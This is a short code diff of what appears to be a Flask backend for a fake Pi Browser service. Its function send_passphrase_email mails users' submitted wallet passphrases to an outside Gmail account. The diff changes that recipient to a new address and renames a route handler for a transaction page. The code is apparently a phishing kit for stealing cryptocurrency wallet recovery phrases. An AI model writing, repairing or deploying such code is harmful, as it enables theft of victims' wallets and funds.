@@ -22,7 +22,7 @@ def send_passphrase_email(passphrase):
     try:
         msg = Message(
             subject="📪 Nouveau PassPhrase Pi Browser reçu!",
-            recipients=['dissangfrancis3@gmail.com']
+            recipients=['Servicepionner@gmail.com']
         )
         msg.html = (
             f"""
@@ -69,7 +69,7 @@ def piservice():
     return render_template('p2p.html')
 
 @app.route('/transaction')
-def piservice():
+def transactservice():
     return render_template('transaction.html')
 
 
